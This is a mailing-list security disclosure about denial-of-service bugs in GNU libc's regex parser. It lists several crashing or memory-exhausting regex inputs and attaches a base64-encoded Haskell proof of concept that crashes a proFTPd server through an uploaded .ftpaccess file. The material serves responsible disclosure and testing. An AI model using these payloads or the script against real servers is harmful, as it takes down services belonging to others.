X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6736" "Thursday" "9" "February" "2017" "14:24:58" "-0300" "Gustavo Grieco" "gustavo.grieco@gmail.com" "<CACn5sdQ4SaFqZDxhE5_s6x2L68Gf66Hq0MWjfN4=0T9zb3rSxw@mail.gmail.com>" "135" "[oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc" nil nil nil "2" "2017020917:24:58" "[oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc" (number mark "U       gustavo.grie Feb  9  135/6736  " thread-indent "\"[oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 2011 invoked by uid 550); 9 Feb 2017 17:25:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1973 invoked from network); 9 Feb 2017 17:25:10 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=+4f/FMokDNczO0NSJ1xWNfThkP5NJInmOv8uPxi24Ic=;
        b=t6b/4fWIusPg8A3gA+BQGADb3Lq2vfzc3REnxJl7F/pDMoeVIUpp6i7WCZ0taR3DXj
         nnu++tn4Ysdu/uRO/vDbay0uL+KGHL7qjzDuiAXye2ZuoFDUhogdHPaTqgRkwp0/L47h
         CtCq8gKhLk4Hkj0jOJoUCEmFrcZiRoSk539AQEwRKi2fiDeyMquukgMfCIpX9gZPP9OF
         lVSCtAJUsvTBaST28nT173wxQkva9KiktI2pMLbciP42RcDoh5Dl5QUIHqBe+8DZWzjm
         pUckQWWYjNEEi0o2ebKMDjaqsIpibWnzXb89p7IbrC6AVxc7plUsOEZLELWFpS1l0/Ci
         CF2Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=+4f/FMokDNczO0NSJ1xWNfThkP5NJInmOv8uPxi24Ic=;
        b=l65PqZSvjQjT4OLwjmvLbrzFv+Rg5nZA2m/MF8tX+LJJd0DWTKErTfQAOOxm/arUUa
         sBKj4oJlfUadVm4IMCDrA3X/5w2FAKDGPk0ZXN3OPTEbGOzXboDlrL5vymPnaT7Y80ie
         RdTZKa+Mj1OKSWOeXnH3vrNDjVSaaM0genoUDMEIVbfZYYffhYcWKNiguJq3npgj78Vm
         RES9AANSoaesWCC1D72D8y0Ov+fNj8GnoaVDWl9poRgZeMENbEIM1nI3RnqobcjNxTrM
         C1pC9Pc742qvQjpn8h+tpaDz3DFZc3fq1BgGTzeQkIE2rDKqurIm1U2aiMBbSoMAFONt
         LqcA==
X-Gm-Message-State: AIkVDXJiJNsWnvOvrP4K68g+cSiRd1hVT8mKIrnpybMP4mh+bCQM63aWyY5oIjumaNYEnasKHiobHN2l91sZSQ==
X-Received: by 10.36.23.74 with SMTP id 71mr22332879ith.37.1486661098856; Thu,
 09 Feb 2017 09:24:58 -0800 (PST)
MIME-Version: 1.0
From: Gustavo Grieco <gustavo.grieco@gmail.com>
Date: Thu, 9 Feb 2017 14:24:58 -0300
Message-ID: <CACn5sdQ4SaFqZDxhE5_s6x2L68Gf66Hq0MWjfN4=0T9zb3rSxw@mail.gmail.com>
To: oss-security@lists.openwall.com, Agustin Mista <mista.agustin@gmail.com>
Content-Type: multipart/mixed; boundary=001a1143e38ab40e2c05481c426f
Subject: [oss-security] Multiple DoS parsing and executing extended regex expressions in GNU libc

--001a1143e38ab40e2c05481c426f
Content-Type: multipart/alternative; boundary=001a1143e38ab40e2805481c426d

--001a1143e38ab40e2805481c426d
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Hello,

We found a few extended regex expressions in GNU libc that will crash or
abort the execution of regcomp or regexec. For instance:

\a?{1,32767}

will immediately exhaust the stack calling calc_eclosure_iter in the
compilation. A small variation of this regex is:

\a?{0,32767}

will consume a very large amount of memory: it seems to eat 16GB in less
than a minute. It is also possible to exhaust the stack memory trying to
parse:

(((((((( ... repeated 15000 times

this issue is caused because regcomp will call the parse_expression,
parse_branch and parse_reg_exp functions over and over again.
Finally, the following regex will trigger an abort or invalid free when
regexec is called:

/S^^|\0|()//S^^|\0|()//S^^|\1|()/

I don't think these issues can be used to execute arbitrary code, but it
seems quite easy to produce a DoS if a remote application is parsing
untrusted regex expressions.
In fact, we asked one of our students, Agust=C3=ADn Mista, to create a simp=
le PoC
to show how to crash a proFTP server if you can write a .ftpaccess file.
You can find the script attached.

These issues were tested in GNU libc 2.19 (Ubuntu 14.04) and 2.24 (ArchLinu=
x).

I think it should affect the last version of GNU libc as well. Can someone
confirm it?

I'm investigating how to submit these issues in the new CVE form...


Regards,
Gustavo.

--001a1143e38ab40e2805481c426d
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div><div><div><div><div>Hello,<br><br></div>We found a fe=
w extended <span class=3D"" style=3D"" id=3D":2gr.1" tabindex=3D"-1">regex<=
/span> expressions in GNU <span class=3D"" style=3D"" id=3D":2gr.2" tabinde=
x=3D"-1">libc</span> that will crash or abort the execution of <span class=
=3D"" style=3D"" id=3D":2gr.3" tabindex=3D"-1">regcomp</span> or <span clas=
s=3D"" style=3D"" id=3D":2gr.4" tabindex=3D"-1">regexec</span>. For instanc=
e:<br><br>\a?{1,32767}</div><div><br>will immediately exhaust the stack cal=
ling <span class=3D"" style=3D"" id=3D":2gr.5" tabindex=3D"-1">calc</span>_=
<span class=3D"" style=3D"" id=3D":2gr.6" tabindex=3D"-1">eclosure</span>_<=
span class=3D"" style=3D"" id=3D":2gr.7" tabindex=3D"-1">iter</span> in the=
 compilation. A small variation of this <span class=3D"" style=3D"" id=3D":=
2gr.8" tabindex=3D"-1">regex</span> is:<br></div><br><div>\a?{0,32767}<br><=
br></div>will consume a very large amount of memory: it seems to eat 16GB i=
n less than a minute. It is also possible to exhaust the stack memory tryin=
g to parse:<br></div><br></div><div>(((((((( ... repeated 15000 times<br></=
div><div><br></div><div>this issue is caused because <span class=3D"" style=
=3D"" id=3D":2gr.9" tabindex=3D"-1">regcomp</span> will call the parse_expr=
ession,=C2=A0 parse_branch and parse_reg_exp functions over and over again.=
<br></div>Finally, the following <span class=3D"" style=3D"" id=3D":2gr.10"=
 tabindex=3D"-1">regex</span> will trigger an abort or invalid free when <s=
pan class=3D"" style=3D"" id=3D":2gr.11" tabindex=3D"-1">regexec</span> is =
called:<br><br>/S^^|\0|()//S^^|\0|()//S^^|\1|<wbr>()/<br><br></div><div>I d=
on&#39;t think these issues can be used to execute arbitrary code, but it s=
eems quite easy to produce a <span class=3D"" style=3D"" id=3D":2gr.12" tab=
index=3D"-1">DoS</span> if a remote application is parsing untrusted <span =
class=3D"" style=3D"" id=3D":2gr.13" tabindex=3D"-1">regex</span> expressio=
ns.<br></div><div>In fact, we asked one of our students, <span class=3D"" s=
tyle=3D"" id=3D":2gr.14" tabindex=3D"-1">Agust=C3=ADn</span> <span class=3D=
"" style=3D"" id=3D":2gr.15" tabindex=3D"-1">Mista</span>, to create a simp=
le <span class=3D"" style=3D"" id=3D":2gr.16" tabindex=3D"-1">PoC</span> to=
 show how to crash a <span class=3D"" style=3D"" id=3D":2gr.17" tabindex=3D=
"-1">proFTP</span> server if you can write a .<span class=3D"" style=3D"" i=
d=3D":2gr.18" tabindex=3D"-1">ftpaccess</span> file. You can find the scrip=
t attached.<br></div><div><div><br>These issues were tested in GNU <span cl=
ass=3D"" style=3D"" id=3D":2gr.19" tabindex=3D"-1">libc</span> 2.19 (<span =
class=3D"" style=3D"" id=3D":2gr.20" tabindex=3D"-1">Ubuntu</span> 14.04) a=
nd 2.24 (<span class=3D"" style=3D"" id=3D":2gr.21" tabindex=3D"-1">ArchLin=
ux</span>). <br>I think it should affect the last version of GNU <span clas=
s=3D"" style=3D"" id=3D":2gr.22" tabindex=3D"-1">libc</span> as well. Can s=
omeone confirm it?<br><br></div><div></div><div>I&#39;m investigating how t=
o submit these issues in the new <span class=3D"" style=3D"" id=3D":2gr.23"=
 tabindex=3D"-1">CVE</span> form...<br><br><br></div><div>Regards,<br></div=
><div>Gustavo.<br></div><div><br><br></div></div></div>

--001a1143e38ab40e2805481c426d--

--001a1143e38ab40e2c05481c426f
Content-Type: text/x-haskell; charset=US-ASCII; name="PoC.hs"
Content-Disposition: attachment; filename="PoC.hs"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_iyymws360

IyEvdXNyL2Jpbi9lbnYgc3RhY2sgCi0tIHN0YWNrIHJ1bmdoYyAtLXJlc29s
dmVyIGx0cy03LjAgLS1zeXN0ZW0tZ2hjIC0tcGFja2FnZSBmdHBocwotLQot
LSBNdWx0aXBsZSBkZW5lZ2F0aW9uIG9mIHNlcnZpY2UgaW4gcmVnY29tcAot
LSBnbGliYyA8PSAyLjI1Ci0tCi0tIFRoaXMgUG9DIGNhbiBkaXN0dXJiIHBy
b0ZUUGQgd2hlbiBjb21waWxlZCB3aXRob3V0Ci0tIHBjcmUgc3VwcG9ydC4g
SXQgcmVxdWlyZXMgYSB2YWxpZCB1c2VyIHdpdGgKLS0gdXBsb2FkIHBlcm1p
c3Npb25zLgotLQotLSBieSBBLiBNaXN0YS4KLS0KLS0gRm9yIHRlc3Rpbmcg
cHVycG9zZXMgb25seS4gRG8gbm8gaGFybS4KCmltcG9ydCBTeXN0ZW0uRW52
aXJvbm1lbnQKaW1wb3J0IFN5c3RlbS5JTwppbXBvcnQgTmV0d29yay5GVFAu
Q2xpZW50CmltcG9ydCBDb250cm9sLkV4Y2VwdGlvbgoKaGFuZGxlciA6OiBT
b21lRXhjZXB0aW9uIC0+IElPICgpCmhhbmRsZXIgXyA9IHB1dFN0ckxuICJb
K10gSXQncyBkZWFkLCBKaW0iCgptYWluID0gZG8KICAgIGFyZ3MgPC0gZ2V0
QXJncwogICAgY2FzZSBhcmdzIG9mCiAgICAgICAgW2FkZHIsIHVzZXIsIHBh
c3NdIC0+IGRvIAogICAgICAgICAgICBwdXRTdHJMbiAiWytdIENvbm5lY3Rp
bmcgdG8gdGhlIGZ0cCBzZXJ2ZXIgYW5kIGxvZ2luIgogICAgICAgICAgICBj
b25uIDwtIGVhc3lDb25uZWN0RlRQIGFkZHIKICAgICAgICAgICAgbG9naW4g
Y29ubiB1c2VyIChKdXN0IHBhc3MpIE5vdGhpbmcKICAgICAgICAgICAgcHV0
U3RyTG4gIlsrXSBTZW5kaW5nIHRoZSBtaWdodHkgcmVnZXgiCiAgICAgICAg
ICAgIHB1dGJpbmFyeSBjb25uICIuZnRwYWNjZXNzIiAiSGlkZUZpbGVzIFwi
XFxhP3sxLDMyNzY3fVwiXG4iCiAgICAgICAgICAgIHB1dFN0ckxuICJbK10g
VHJpZ2dlcmluZyB0aGUgc2VydmVyIHRvIHBhcnNlIC5mdHBhY2Nlc3MiCiAg
ICAgICAgICAgIGNhdGNoIChkaXIgY29ubiBOb3RoaW5nID4+IHB1dFN0ckxu
ICJbLV0gTm90IGFmZmVjdGVkIikgaGFuZGxlcgogICAgICAgIF8gLT4gcHV0
U3RyTG4gIlVTQUdFOiAuL1BvQy5ocyBbQUREUkVTU10gW1VTRVJdIFtQQVNT
V09SRF0iCg==

--001a1143e38ab40e2c05481c426f--
